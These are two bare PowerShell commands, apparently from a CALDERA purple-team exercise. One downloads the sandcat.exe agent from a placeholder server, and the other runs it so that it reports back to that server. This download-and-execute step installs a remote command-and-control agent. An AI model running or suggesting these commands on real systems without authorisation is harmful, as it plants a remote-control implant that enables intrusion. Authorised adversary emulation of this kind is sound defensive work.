Invoke-WebRequest -Uri http://caldera_server_address/sandcat.exe -OutFile sandcat.exe
./sandcat.exe --server http://caldera_server_address --group "purple_team"
